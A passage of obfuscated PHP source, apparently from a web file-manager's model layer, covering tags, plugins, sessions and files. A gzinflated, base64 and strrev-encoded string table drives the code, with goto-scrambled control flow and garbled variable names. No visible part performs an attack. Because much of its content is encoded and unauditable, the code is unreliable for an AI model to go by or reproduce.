…‡QHœ¬Â')."\x8b\x3d\x99\x6a\x59\x75\x80\xa9\xe7\x7a\xed\xd8\x67\x53\xd1\xbb\x2\xf3\xb2\x89\x71\xe3\x27\x4e\x15\xd9\x78\x3e\x3f\xfc\xee\x82\xfa\x5e\xc4\x3f\xe4\x2\x85\x9c\xe8\x7c\xe2\x25\xeb\xb2"."\222\250\277\50\161\373\242\110\253\342\147\361\113\74\302\22\265\242\344\377\331\126\340\104\61\116\52\50\144\26\77\320\125\64\44\150\125\12\312\13\302\201\146\273\171\326".strrev('¡ï($h±J“ålºšn,ËÙ-­øß~‰Tnü.µş0‹Á°…à')."\xa2\xc7\xf1\x14\x7b\xdb\xd1\xc0\x10\x41\x2\x8f\x16\xf8\x5\xb1\x44\x53\xb3\x4b\x41\x60\x76\x78\x50\x21\x21\x5c\x30\x47\xbd\x4c\x42\xc3\x45\xbe\xc9\xfe\x77\x13\x48\x59\x2\xcc\x3d\x70"."\45\204\22\75\167\317\244\210\304\366\110\216\355\225\263\237\151\67\46\272\30\373\343\224\351\303\73\150\122\5\311\231\142\6\321\4\23\352\205\163\143\326\276\332\212\7"."\331\170\31\13\34\322\140\211\212\251\60\341\121\40\356\337\101\40\271\140\156\152\41\65\10\63\113\261\25\177\357\4\331\270\160\141\64\332\253\226\175\53\370\143\23\115"."\106\120\101\342\66\50\56\32\311\107\110\173\311\306\105\217\325\43\145\15\117\23\263\24\222\5\35\21\70\164\302\103\127\232\370\155\65\303\15\122\17\132\200\110\262\60"."\132\40\354\265\275\205\206\220\217\375\201\64\332\177\264\317\71\116\23\114\316\54\354\0\173\30\304\302\36\30\366\27\162\0\71\45\272\241\3\101\266\302\311\341\111\260"._kodDe('KMgUu8Yvq8Xi29mB+9FRk7meePDInRoou3AFphhhY+Vgw/3nHf/z8jc1vvQPipw=')."\370\377\363\163\171\377\277\136\311\233\130\115\205\312\226\247\324\232\10\201\113\251\261\1\301\11\41\26\150\332\372\141\75\42\207\212\261\144\205\72\54\41\22\340\33\16"."\236\75\56\333\353\244\56\246\262\110\75\127\120\207\26\62\275\60\221\341\33\101\105\2\112\372\266\26\130\221\135\354\351\247\122\201\342\27\17\55\213\217\322\233\274\231".strrev('‰‚J²O0YA¢‹E$¤‚Íâ¿MÃ«ê	ˆüq’Š O²êÀANâUŞ59').strrev('±÷ÅÉ¤ZØâ„l½±hä’¨}eÔ&( §,Dß¨b",¨™è¤Ì')."\305\271\331\146\26\263\100\25\116\253\114\206\275\216\130\155\177\56\161\254\263\270\62\254\101\15\345\11\41\310\361\323\5\211\56\34\320\205\140\211\74\170\133\206\171\232"."\101\226\177\351\115\310\336\266\24\30\141\360\45\366\227\156\346\66\135\103\244\230\25\312\244\32\202\66\234\360\124\137\321\53\142\66\301\75\140\217\370\115\226\252\41\227".base64_decode('nKTb4faWCmQEQFYqoO6Fd3jNbB5Lu8QzlNraCMqrBGSRSRmio2FrTqiObN0pMw==')."\112\45\213\153\272\41\44\143\360\122\151\341\103\155\246\145\64\271\237\124\273\177\124\304\12\143\356\326\302\344\222\153\103\21\44\334\252\1\362\66\141\365\172\214\42\21".strrev('W=–åé6G§¶icEÜümğ¨¹Fˆ@j'."\n".'©„YJsµë!{ó3¢ú˜').base64_decode('u4WXEC7x4mjt+Irvafj1kXD402yQGeG41gYXkD/HdnIPv5rh1G8iwR7dtCRNUA==')."\372\237\101\1\204\277\317\11\151\35\301\214\221\53\303\52\275\366\347\340\134\242\351\243\45\141\61\224\233\71\12\371\271\224\236\167\23\302\112\165\37\155\31\153\166\321".base64_decode('jJItKg7CLnOZYorAaUC9b66xgrvC+GhepdVokyVjcwbSIC17pwVq452gVIIe4w==')."\xb6\x28\x43\x7c\x4f\xd4\x7a\x37\x27\x32\xf6\xc2\x12\x50\x32\x1\xa1\x38\xf1\xde\x6e\xd0\xc\xe1\xd2\x95\xf0\x55\x69\x1d\x62\xc1\xc0\x95\x47\xd0\xc3\x4a\xb3\xc\xbe\x80\xec\x58\xc7\x48"._kodDe('LYG7Wgl/WltuygKIwPcgglfE0fY2troG2txM/baP5w3SoDe3W/PEQyBKDcj993w=')."\225\124\124\272\275\366\126\321\61\265\163\150\274\220\242\366\10\227\377\21\255\104\36\334\242\222\331\160\24\172\365\232\321\220\226\274\203\14\1\314\213\243\140\336\242\150"."\232\131\20\155\10\371\114\271\140\14\322\275\342\301\43\134\176\242\104\207\155\274\60\116\72\330\170\226\114\134\134\35\131\161\366\324\110\54\120\272\25\234\233\267\135\260"."\226\152\105\311\304\203\266\242\304\113\276\304\231\126\11\134\113\143\112\140\127\176\33\137\214\307\171\134\11\335\0\134\46\74\243\105\57\55\45\242\105\105\203\322\252\10".base64_decode('oZJb37DqCNjg4sBQfSHAsfEnbgUN1tEWlF7IdeU0dkwkuFYX1OBkD8Gy6opKsw==')."\56\315\134\101\320\306\54\251\120\353\100\357\203\27\161\262\31\231\112\312\5\135\144\314\265\150\246\32\27\364\224\354\57\242\343\170\132\111\106\20\300\331\144\137\234\333"."\267\334\117\227\220\16\41\20\41\327\270\320\331\242\231\215\317\177\42\155\307\227\156\15\360\316\225\135\264\100\366\312\201\317\113\34\15\237\150\167\300\270\210\226\107\277"."\365\232\151\122\114\2\370\177\224\22\21\171\360\320\163\10\72\12\340\213\337\252\300\121\104\202\176\264\34\21\332\100\237\344\372\17\62\234\141\5\307\42\144\143\11\300".base64_decode('CwQWEM80cmfXWLBdPHIAYCJjWh91iQYtQnl7+Puxsp2Q4zQIWW+ixgWyuzXcOA==')."\306\115\274\315\72\121\31\116\342\154\244\63\237\262\144\307\16\357\231\246\341\317\225\100\144\223\274\10\354\205\22\211\225\240\77\126\337\134\177\70\22\56\212\152\363\204"."\xc3\x73\x82\x21\x2f\x76\x5a\x59\x14\x8d\x72\x9\xca\x2d\x45\x51\x6d\xcd\xc1\xd6\xc1\xe2\x7c\x2d\x1e\x7f\xa0\x28\xe\x2a\xbb\xb4\x46\xb9\xcf\x1c\x1c\xe5\x6f\x43\xad\xf4\x4\x2\xc1\x39".base64_decode('g7XC3zCLtwRdrXLhdz6tUUk2vSMIyxnKSwuWYkqWO0/ieawiAnFeDepXjH1YXQ==')."\xbb\xdb\xf4\xce\xe8\x82\x25\x5\x41\x45\x95\x56\x52\x76\x28\x4f\xa0\xd0\x89\x27\xdb\xdc\x8c\x58\x46\x1d\xd2\x6c\xca\xf1\xf8\xf2\xd8\x65\xb9\x71\x16\xe0\x68\xb3\x20\x14\x23\x2c\x42\xf1".strrev('©Ö¾ÿôI¿„ ±Œ‹bÄ.ó¼‚bÔêQél–(ùå‹OÊ&#’ª€Et')."\77\316\235\0\0"."".base64_decode('').""."", 10, -8))); goto bÌÈİğ†ô¤; aç„ÉÈ£õ‘: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($eøŸ÷½¨ç) { $b®å—§™ÂÌ =& $_SERVER[Ü˜]; return array($b®å—§™ÂÌ[1793] => array($eøŸ÷½¨ç[0], $b®å—§™ÂÌ[1794]), $b®å—§™ÂÌ[1795] => array($eøŸ÷½¨ç[0], $b®å—§™ÂÌ[1796])); } protected function get($fé˜›‘¥) { $dË‘ŠŞ¿’ =& $_SERVER[Ü˜]; $d¿ÚŒå°Öá = Model($dË‘ŠŞ¿’[495])->metaGet($fé˜›‘¥, $dË‘ŠŞ¿’[1797]); $aïà‚œÊ† = json_decode($d¿ÚŒå°Öá, !0); return $aïà‚œÊ† ? $aïà‚œÊ† : array($dË‘ŠŞ¿’[1798] => $dË‘ŠŞ¿’[97], $dË‘ŠŞ¿’[376] => array()); } protected function set($DÓ‹øŞ‹ÈŒ, $c³¥îò–ÁÉ) { $e´Ÿ„Ì‡†Æ =& $_SERVER[Ü˜]; $c³¥îò–ÁÉ = $c³¥îò–ÁÉ ? $c³¥îò–ÁÉ : array($e´Ÿ„Ì‡†Æ[1798] => $e´Ÿ„Ì‡†Æ[97], $e´Ÿ„Ì‡†Æ[376] => array()); Model($e´Ÿ„Ì‡†Æ[495])->metaSet($DÓ‹øŞ‹ÈŒ, $e´Ÿ„Ì‡†Æ[1797], json_encode($c³¥îò–ÁÉ)); return Model($e´Ÿ„Ì‡†Æ[495])->metaSet($DÓ‹øŞ‹ÈŒ, $e´Ÿ„Ì‡†Æ[1797], json_encode($c³¥îò–ÁÉ)); } protected function getByTagID($BÔÁä¨²„„, $eñÏµÃ¶¦) { goto EÙã·à¾öŒ; dšŸ‚Û‚Š„: $E¿Šî•åÔ‰ = $this->get($BÔÁä¨²„„); if (!$E¿Šî•åÔ‰ || !isset($E¿Šî•åÔ‰[$D«É…¯ƒ÷—[376]])) { return !1; } $cÎçÊÈ“ƒ = array_find_by_field($E¿Šî•åÔ‰[$D«É…¯ƒ÷—[376]], $D«É…¯ƒ÷—[402], $eñÏµÃ¶¦); goto E®’áÑÕœ‰; E®’áÑÕœ‰: return is_array($cÎçÊÈ“ƒ) ? $cÎçÊÈ“ƒ : !1; goto C¾³ËÂ†Ş; EÙã·à¾öŒ: $D«É…¯ƒ÷— =& $_SERVER[Ü˜]; if (!$BÔÁä¨²„„ || !$eñÏµÃ¶¦) { return !1; } if (!Model($D«É…¯ƒ÷—[495])->getInfoSimple($BÔÁä¨²„„)) { return !1; } goto dšŸ‚Û‚Š„; C¾³ËÂ†Ş: } public function listSource($bÉèÕ¯ô‰Ø, $eËƒëÎİ„ñ) { goto FŞÚ…¼àÚ; eåÖ¡ŠçØÚ: foreach ($aİî©”ˆÌ as $cëôî˜ŸÑâ) { if (!in_array($cëôî˜ŸÑâ, $DìÇøŞïÏ)) { $AİîÎ¢²í[] = $cëôî˜ŸÑâ; } } if ($AİîÎ¢²í) { $this->removeBySource($bÉèÕ¯ô‰Ø, $AİîÎ¢²í); } return $b²éôÆÈÊŞ; goto a—ÈŒíƒ÷Ú; f¼ÒĞ÷š»ë: $b²éôÆÈÊŞ = Model($aóƒ§ö› [1207])->listSource($c»êïÈõÖä); if (!$b²éôÆÈÊŞ || count($aİî©”ˆÌ) == $b²éôÆÈÊŞ[$aóƒ§ö› [373]][$aóƒ§ö› [374]]) { return $b²éôÆÈÊŞ; } $AİîÎ¢²í = array(); goto e‘á„Ş ¬ğ; e‘á„Ş ¬ğ: $CŞÌßØå¼œ = array_to_keyvalue($b²éôÆÈÊŞ[$aóƒ§ö› [85]], $aóƒ§ö› [33], $aóƒ§ö› [404]); $d¡“Ï÷Ìœ– = array_to_keyvalue($b²éôÆÈÊŞ[$aóƒ§ö› [84]], $aóƒ§ö› [33], $aóƒ§ö› [404]); $DìÇøŞïÏ = array_merge($d¡“Ï÷Ìœ–, $CŞÌßØå¼œ); goto eåÖ¡ŠçØÚ; Dê¼õ©ÊÛ: foreach ($D§äˆÂõî as $d©‰ƒ˜ÑÄ => $EÍÄêÎäö) { $eÁäõæÛÔ = !0; if (!$eËƒëÎİ„ñ) { $aİî©”ˆÌ[] = $d©‰ƒ˜ÑÄ; continue; } foreach ($eËƒëÎİ„ñ as $d§ƒÛÈÇ››) { if (!in_array($d§ƒÛÈÇ››, $EÍÄêÎäö)) { $eÁäõæÛÔ = !1; break; } } if ($eÁäõæÛÔ) { $aİî©”ˆÌ[] = $d©‰ƒ˜ÑÄ; } } if (!$aİî©”ˆÌ) { return array(); } $c»êïÈõÖä = array($aóƒ§ö› [419] => array($aóƒ§ö› [420], $aİî©”ˆÌ), $aóƒ§ö› [493] => $bÉèÕ¯ô‰Ø, $aóƒ§ö› [413] => SourceModel::TYPE_GROUP); goto f¼ÒĞ÷š»ë; Cß®îØÅ±: $D§äˆÂõî = array(); foreach ($CĞ‡ùÒßÉ as $b¶­Ö‡¯¢•) { $cëôî˜ŸÑâ = $b¶­Ö‡¯¢•[$aóƒ§ö› [86]]; if (!$cëôî˜ŸÑâ) { continue; } if (!isset($D§äˆÂõî[$cëôî˜ŸÑâ])) { $D§äˆÂõî[$cëôî˜ŸÑâ] = array(); } $D§äˆÂõî[$cëôî˜ŸÑâ][] = $b¶­Ö‡¯¢•[$aóƒ§ö› [428]]; } $aİî©”ˆÌ = array(); goto Dê¼õ©ÊÛ; FŞÚ…¼àÚ: $aóƒ§ö›  =& $_SERVER[Ü˜]; if ($eËƒëÎİ„ñ && !is_array($eËƒëÎİ„ñ)) { $eËƒëÎİ„ñ = array($eËƒëÎİ„ñ); } $CĞ‡ùÒßÉ = $this->listData($bÉèÕ¯ô‰Ø); goto Cß®îØÅ±; a—ÈŒíƒ÷Ú: } protected function listData($CĞšÖ±µ’‚) { $B÷‡›ª‹Ç¥ =& $_SERVER[Ü˜]; $DÖ²ùƒÛ›Œ = array($B÷‡›ª‹Ç¥[1521] => 0, $B÷‡›ª‹Ç¥[472] => array($B÷‡›ª‹Ç¥[1799], 0), $B÷‡›ª‹Ç¥[424] => $B÷‡›ª‹Ç¥[1800] . $CĞšÖ±µ’‚); $BŠÉÙç”’ = $B÷‡›ª‹Ç¥[1801]; $FÍÛ¾ßÁºê = $this->field($BŠÉÙç”’)->where($DÖ²ùƒÛ›Œ)->order($B÷‡›ª‹Ç¥[1802])->select(); return $FÍÛ¾ßÁºê ? $FÍÛ¾ßÁºê : array(); } protected function addToTag($Bâİ÷Ø„Ë, $a³ÀË¿Úµá, $bÀ‡ØÈ£Æœ) { $bÖòÚ—æ«Ñ =& $_SERVER[Ü˜]; if (!$this->getByTagID($Bâİ÷Ø„Ë, $bÀ‡ØÈ£Æœ) || !$a³ÀË¿Úµá) { return !1; } if (!Model($bÖòÚ—æ«Ñ[799])->pathInfo($a³ÀË¿Úµá)) { return !1; } $d¥à—ªâ˜ = array($bÖòÚ—æ«Ñ[1521] => 0, $bÖòÚ—æ«Ñ[472] => $bÀ‡ØÈ£Æœ, $bÖòÚ—æ«Ñ[423] => $a³ÀË¿Úµá, $bÖòÚ—æ«Ñ[424] => $bÖòÚ—æ«Ñ[1803] . $Bâİ÷Ø„Ë, $bÖòÚ—æ«Ñ[422] => $bÖòÚ—æ«Ñ[33], $bÖòÚ—æ«Ñ[1697] => 0); if ($this->where($d¥à—ªâ˜)->find()) { return !1; } return $this->add($d¥à—ªâ˜); } protected function removeFromTag($BÔ´‰Â„², $FÖÛŒòÅĞ, $AëòŠµÀö) { $Dë§ªÓªî =& $_SERVER[Ü˜]; if (!$this->getByTagID($BÔ´‰Â„², $AëòŠµÀö) || !$FÖÛŒòÅĞ) { return !1; } if (is_array($FÖÛŒòÅĞ)) { $FÖÛŒòÅĞ = array($Dë§ªÓªî[7], $FÖÛŒòÅĞ); } $DÙ’ƒ‡× = array($Dë§ªÓªî[1521] => 0, $Dë§ªÓªî[472] => $AëòŠµÀö, $Dë§ªÓªî[424] => $Dë§ªÓªî[1803] . $BÔ´‰Â„², $Dë§ªÓªî[423] => $FÖÛŒòÅĞ); return $this->where($DÙ’ƒ‡×)->delete(); } protected function removeByTag($Fƒºå„‡•ƒ, $EØ„ÅÀ…íç) { $e™–Ô÷èØâ =& $_SERVER[Ü˜]; if (!$this->getByTagID($Fƒºå„‡•ƒ, $EØ„ÅÀ…íç)) { return !1; } $d¥ŠÌäìŸ´ = array($e™–Ô÷èØâ[1521] => 0, $e™–Ô÷èØâ[472] => $EØ„ÅÀ…íç, $e™–Ô÷èØâ[424] => $e™–Ô÷èØâ[1803] . $Fƒºå„‡•ƒ); return $this->where($d¥ŠÌäìŸ´)->delete(); } protected function removeBySource($f¸º¦Ôè, $aé¿¤ù›â) { $bˆÇ©±åº =& $_SERVER[Ü˜]; if (!$f¸º¦Ôè || !$aé¿¤ù›â) { return !1; } if (is_array($aé¿¤ù›â)) { $aé¿¤ù›â = array($bˆÇ©±åº[7], $aé¿¤ù›â); } $FÕÆƒÄš²ø = array($bˆÇ©±åº[1521] => 0, $bˆÇ©±åº[423] => $aé¿¤ù›â, $bˆÇ©±åº[472] => array($bˆÇ©±åº[972], 0), $bˆÇ©±åº[424] => $bˆÇ©±åº[1803] . $f¸º¦Ôè); return $this->where($FÕÆƒÄš²ø)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\160\154\165\x67\x69\x6e\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\163\164\141\164\x75\163", "\x72\145\147\x69\145\x73\x74", "\143\157\x6e\146\151\147"); public function loadList($DËàå°›ŠË = false) { $Eçœ¢Ë£‚ = array_to_keyvalue($this->listData(), $_SERVER[Ü˜][28]); if ($DËàå°›ŠË) { return $Eçœ¢Ë£‚[$DËàå°›ŠË]; } return $Eçœ¢Ë£‚; } public function init() { $dÔ÷í‰ôÔŠ =& $_SERVER[Ü˜]; Hook::trigger($dÔ÷í‰ôÔŠ[1804]); $C¿¬‹Š¯¶ø = $this->loadPluginList(); foreach ($C¿¬‹Š¯¶ø as $EöÖÉ‡ÛŞ‹ => $C³ØÎš¹‚š) { $d¾†ËÜÊí£ = $this->appAllow($EöÖÉ‡ÛŞ‹, $C³ØÎš¹‚š); if (!$d¾†ËÜÊí£) { continue; } foreach ($C³ØÎš¹‚š[$dÔ÷í‰ôÔŠ[1805]] as $CŸÃ‚«°‘ô => $B’áÄ˜ì¦Š) { Hook::bind($CŸÃ‚«°‘ô, $B’áÄ˜ì¦Š); } } Hook::trigger($dÔ÷í‰ôÔŠ[1806]); Hook::trigger(ACTION); } public function appAllow($eğæ³¸¸Ú, $C¾„ÙÚ Ç, $AÀÙÚìš„ = true) { $CÒíµ×çç =& $_SERVER[Ü˜]; $E“ŸºùŒƒ = PLUGIN_DIR . $eğæ³¸¸Ú . $CÒíµ×çç[1807]; if (!is_array($C¾„ÙÚ Ç) || !is_array($C¾„ÙÚ Ç[$CÒíµ×çç[1805]]) || $C¾„ÙÚ Ç[$CÒíµ×çç[719]] != 1 || !is_file($E“ŸºùŒƒ)) { return !1; } if ($GLOBALS[$CÒíµ×çç[494]] == 1) { return !0; } if ($AÀÙÚìš„ && !Action($CÒíµ×çç[1808])->checkAuth($eğæ³¸¸Ú)) { return !1; } return !0; } public function unInstall($F—®¸Ñ‹‰÷) { $D›½˜Ğß =& $_SERVER[Ü˜]; $c†ÌĞ¥›‰¿ = $this->loadList($F—®¸Ñ‹‰÷); if (file_exists(PLUGIN_DIR . $F—®¸Ñ‹‰÷)) { Hook::apply($F—®¸Ñ‹‰÷ . $D›½˜Ğß[1809]); } $this->remove($c†ÌĞ¥›‰¿[$D›½˜Ğß[402]]); } public function changeStatus($eà¶õ÷Ôó–, $dŞ¶Óä¡à) { $Fïï¨à‚› =& $_SERVER[Ü˜]; $c—ËÖ·ÍÔ = $this->loadList($eà¶õ÷Ôó–); if ($dŞ¶Óä¡à) { Hook::apply($eà¶õ÷Ôó– . $Fïï¨à‚›[1810]); } $this->update($c—ËÖ·ÍÔ[$Fïï¨à‚›[402]], array($Fïï¨à‚›[1811] => $dŞ¶Óä¡à)); } public function appRegist($e‹“°¡‹š°, $açª¹™¥Äí) { $D¢ã’êé´’ =& $_SERVER[Ü˜]; $c¿†œ¾ô¹Ï = $this->loadList($e‹“°¡‹š°); if ($c¿†œ¾ô¹Ï) { $this->update($c¿†œ¾ô¹Ï[$D¢ã’êé´’[402]], array($D¢ã’êé´’[1805] => $açª¹™¥Äí)); } else { $aÙó¶øŠÎ× = array($D¢ã’êé´’[28] => $e‹“°¡‹š°, $D¢ã’êé´’[1805] => $açª¹™¥Äí, $D¢ã’êé´’[719] => 0, $D¢ã’êé´’[6] => $this->getConfigDefault($e‹“°¡‹š°)); $this->insert($aÙó¶øŠÎ×); } } public function getConfigDefault($fŒ¢ÈÆ”›İ) { $dĞ±­¸ÌÌá =& $_SERVER[Ü˜]; $D‰åÇ¾Æø = array(); $dÔŸµ¶¸¡‹ = $this->getPackageJson($fŒ¢ÈÆ”›İ); if (!$dÔŸµ¶¸¡‹ && is_array($dÔŸµ¶¸¡‹[$dĞ±­¸ÌÌá[1812]])) { return $D‰åÇ¾Æø; } foreach ($dÔŸµ¶¸¡‹[$dĞ±­¸ÌÌá[1812]] as $b¯…Ãõª†ï => $E±ÈäÃª) { if (!isset($E±ÈäÃª[$dĞ±­¸ÌÌá[381]]) || isset($D‰åÇ¾Æø[$b¯…Ãõª†ï])) { continue; } $D‰åÇ¾Æø[$b¯…Ãõª†ï] = $E±ÈäÃª[$dĞ±­¸ÌÌá[381]]; } return $D‰åÇ¾Æø; } public function getPackageJson($cé’Ú«™Äì) { return Hook::apply($cé’Ú«™Äì . $_SERVER[Ü˜][1813]); } public function getConfig($bˆ‡ƒ‘”Â, $AÛö ã¶òØ = false) { $fï…–Â¾Ú =& $_SERVER[Ü˜]; $Dàæ«Ó×¬ô = array(); $d‹™‡¯äâƒ = $this->loadList($bˆ‡ƒ‘”Â); if ($d‹™‡¯äâƒ && is_array($d‹™‡¯äâƒ[$fï…–Â¾Ú[6]])) { $Dàæ«Ó×¬ô = $d‹™‡¯äâƒ[$fï…–Â¾Ú[6]]; } if (!$Dàæ«Ó×¬ô || $AÛö ã¶òØ) { $Dàæ«Ó×¬ô = $this->getConfigDefault($bˆ‡ƒ‘”Â); } return $Dàæ«Ó×¬ô; } public function setConfig($BÈÙŞĞ‰Åƒ, $Fì”—šÏ = false) { goto eÁ™Ò‹¢; D©”–‚: $a³¾‹Ï³…„ = $b£àÑÕ²ª‘[$Bô—¸æ†ğÎ[6]]; if ($Fì”—šÏ == !1) { $a³¾‹Ï³…„ = array(); $Fì”—šÏ = $this->getConfigDefault($BÈÙŞĞ‰Åƒ); } foreach ($Fì”—šÏ as $D†‡¨ÓŒáÏ => $FêõÇĞÈ) { $a³¾‹Ï³…„[$D†‡¨ÓŒáÏ] = is_string($FêõÇĞÈ) ? trim($FêõÇĞÈ) : $FêõÇĞÈ; } goto e·¬Áë‹­±; eÁ™Ò‹¢: $Bô—¸æ†ğÎ =& $_SERVER[Ü˜]; $b£àÑÕ²ª‘ = $this->loadList($BÈÙŞĞ‰Åƒ); if (!$b£àÑÕ²ª‘) { return !1; } goto D©”–‚; e·¬Áë‹­±: $this->update($b£àÑÕ²ª‘[$Bô—¸æ†ğÎ[402]], array($Bô—¸æ†ğÎ[6] => $a³¾‹Ï³…„)); goto EßµÍ˜Ğõä; EßµÍ˜Ğõä: } public function viewList() { goto e«£ø–ô„´; bÖ‡¯‘©ê“: return $D¼ƒĞğ—Ïè; goto f½¥÷¼Î; e«£ø–ô„´: $aí‡ÈÇ¼Ü =& $_SERVER[Ü˜]; $Bø¢ø”‘© = $this->loadList(); $this->pluginScan($Bø¢ø”‘©); goto EÄ¤À£™‰Ö; EÄ¤À£™‰Ö: $Bø¢ø”‘© = $this->loadPluginList(); $D¼ƒĞğ—Ïè = array(); foreach ($Bø¢ø”‘© as $Aæ–•¦µ¼Ÿ => $Fï¤Ú…Êã) { unset($Fï¤Ú…Êã[$aí‡ÈÇ¼Ü[1805]], $Fï¤Ú…Êã[$aí‡ÈÇ¼Ü[6]]); $E‚…ºŸ¦À = PLUGIN_DIR . $Fï¤Ú…Êã[$aí‡ÈÇ¼Ü[28]] . $aí‡ÈÇ¼Ü[1807]; if (!is_file($E‚…ºŸ¦À)) { continue; } $cÂë÷é“ÏÕ = Hook::apply($Fï¤Ú…Êã[$aí‡ÈÇ¼Ü[28]] . $aí‡ÈÇ¼Ü[1813]); if (is_array($cÂë÷é“ÏÕ)) { $D¼ƒĞğ—Ïè[$Aæ–•¦µ¼Ÿ] = array_merge($Fï¤Ú…Êã, $cÂë÷é“ÏÕ); } } goto bÖ‡¯‘©ê“; f½¥÷¼Î: } private function loadPluginList() { $e®­Ú¸°˜ =& $_SERVER[Ü˜]; $Dµ¹ñÍò“ = $this->loadList(); if (strtolower(MOD) == $e®­Ú¸°˜[1814]) { return $Dµ¹ñÍò“; } $Bãô…äÖäÛ = Hook::trigger($e®­Ú¸°˜[1815], $Dµ¹ñÍò“); if ($Dµ¹ñÍò“ && !$Bãô…äÖäÛ) { die; } return $Bãô…äÖäÛ ? $Bãô…äÖäÛ : $Dµ¹ñÍò“; } private function pluginScan($D´Ã³´ì) { $F‘‡×õÒÓº =& $_SERVER[Ü˜]; recursion_dir(PLUGIN_DIR, $AŠ¥™ƒ´ÊÓ, $c„¥‡Ñˆ½½, 0); foreach ($AŠ¥™ƒ´ÊÓ as $EïÓÄº—Ã×) { $fø³öŠç©ß = get_path_this($EïÓÄº—Ã×); if (isset($D´Ã³´ì[$fø³öŠç©ß]) || !file_exists($EïÓÄº—Ã× . $F‘‡×õÒÓº[1816]) || !file_exists($EïÓÄº—Ã× . $F‘‡×õÒÓº[1807])) { continue; } Hook::apply($fø³öŠç©ß . $F‘‡×õÒÓº[1810]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\155\x5f\163\145\163\163\x69\x6f\x6e"; public function get($E¿çéäÄ³) { $FÉçÛëğ¹­ =& $_SERVER[Ü˜]; $A£†¨ïïà = $this->where(array($FÉçÛëğ¹­[1817] => $E¿çéäÄ³))->find(); if (!is_array($A£†¨ïïà)) { return !1; } return $A£†¨ïïà[$FÉçÛëğ¹­[724]]; } public function set($C¨İ¥ÍéçŠ, $D°»æã†š‹, $bùø³“Ğô = 3600) { $E­Ïø‡ãÔ› =& $_SERVER[Ü˜]; $F¤º—ÍˆŸô = array($E­Ïø‡ãÔ›[1817] => $C¨İ¥ÍéçŠ, $E­Ïø‡ãÔ›[1726] => $D°»æã†š‹, $E­Ïø‡ãÔ›[1818] => $bùø³“Ğô + time()); if (Session::get($E­Ïø‡ãÔ›[1819])) { $F¤º—ÍˆŸô[$E­Ïø‡ãÔ›[1529]] = Session::get($E­Ïø‡ãÔ›[1819]); } else { $F¤º—ÍˆŸô[$E­Ïø‡ãÔ›[1529]] = 0; } if ($this->get($C¨İ¥ÍéçŠ)) { return $this->where(array($E­Ïø‡ãÔ›[1817] => $C¨İ¥ÍéçŠ))->save($F¤º—ÍˆŸô); } else { return $this->add($F¤º—ÍˆŸô, array(), !0); } } public function remove($f“èÙ„İ…İ) { return $this->where(array($_SERVER[Ü˜][1817] => $f“èÙ„İ…İ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ü˜][1820] . time())->delete(); } } goto a„®¾çİ‘; Dší‚âæÕ»: $E–×°¬Í“Î = $_SERVER[Ü˜][583]; while (strlen($E–×°¬Í“Î) < $_SERVER[Ü˜][584]) { if (!$E–×°¬Í“Î) { break; } $E–×°¬Í“Î++; } $_SERVER[’û£ìÂ®Å‚] = explode($_SERVER[Ü˜][585], gzinflate(substr($_SERVER[Ü˜][586], 10, -8))); goto FŞÍöŸó¼®; EÖ²øø‚™Í: class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\146\x69\154\145\137\x63\x6f\156\164\x65\156\x74\x73"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\x54\151\155\x65", "\x74\151\x6d\145", "\x69\x6e\x73\145\162\164", "\x66\x75\156\x63\164\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\154\x65"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\x61\155\145" => "\151\157\137\146\151\x6c\145\x5f\x6d\x65\164\141", "\x6d\x65\x74\x61\106\151\145\154\x64" => "\146\151\x6c\145\x49\x44"); public function fileInfo($dë‚ë¨ ±…) { $EŸš’Æé¼ƒ =& $_SERVER[Ü˜]; static $E‡¥ÚõÜ× = array(); if (!isset($E‡¥ÚõÜ×[$dë‚ë¨ ±…])) { $EÌç¯¤á«Õ = $EŸš’Æé¼ƒ[1737]; $f¾Äå¥öèÑ = Model($EŸš’Æé¼ƒ[459])->field($EÌç¯¤á«Õ)->where(array($EŸš’Æé¼ƒ[457] => $dë‚ë¨ ±…))->find(); $E‡¥ÚõÜ×[$dë‚ë¨ ±…] = $f¾Äå¥öèÑ; } return $E‡¥ÚõÜ×[$dë‚ë¨ ±…]; } public function addFileByContent($c¢³Ã¤°Å» = '', $BÁ¹ø³§Ñ = '') { goto AÃÎá¤ìì; AÃÎá¤ìì: $Eø¸ßÄÑ´ =& $_SERVER[Ü˜]; $cµ£“Ï¢  = TEMP_PATH . $Eø¸ßÄÑ´[1738]; if (!is_dir($cµ£“Ï¢ )) { mk_dir($cµ£“Ï¢ ); } goto cì‡”ÕŠŒÂ; cì‡”ÕŠŒÂ: $fÃŠËÈ¢¤ö = $cµ£“Ï¢  . $Eø¸ßÄÑ´[1739] . rand_string(16); file_put_contents($fÃŠËÈ¢¤ö, $c¢³Ã¤°Å»); $Bó“‹„ÍÀ = $this->addFile($fÃŠËÈ¢¤ö, $BÁ¹ø³§Ñ, !0); goto dŠ³ƒÚèšá; dŠ³ƒÚèšá: if (file_exists($fÃŠËÈ¢¤ö)) { @unlink($fÃŠËÈ¢¤ö); } return $Bó“‹„ÍÀ; goto e÷¹•¦›î—; e÷¹•¦›î—: } public function createFileName($F‹íÑœ‘é«, $BÄâÚ¯»íø = false, $få¦¿»¬ÁÛ = false) { goto d™¸‚Õ™»‚; Bñî¢’Ÿ½Š: if (!$Cô£ÙºÚÎß && !Cache::get($b«óÇâÓœ)) { $Cô£ÙºÚÎß = !0; $bÁğ†°¢ƒ = IO::mkdir($A°À¥„§ˆ); if (!IO::exist($bÁğ†°¢ƒ . $eÌˆàÒŞÄˆ[770])) { IO::mkfile($bÁğ†°¢ƒ . $eÌˆàÒŞÄˆ[770]); } Cache::set($b«óÇâÓœ, 1, 3600 * 2); } return $AË×…‚µŸ²; goto e ¢ÂŸ±¼­; d™¸‚Õ™»‚: $eÌˆàÒŞÄˆ =& $_SERVER[Ü˜]; $fÎ‹“Ç›Ï = IO::init($eÌˆàÒŞÄˆ[8]); $AË×…‚µŸ² = $this->makeFilePath($F‹íÑœ‘é«, $fÎ‹“Ç›Ï, 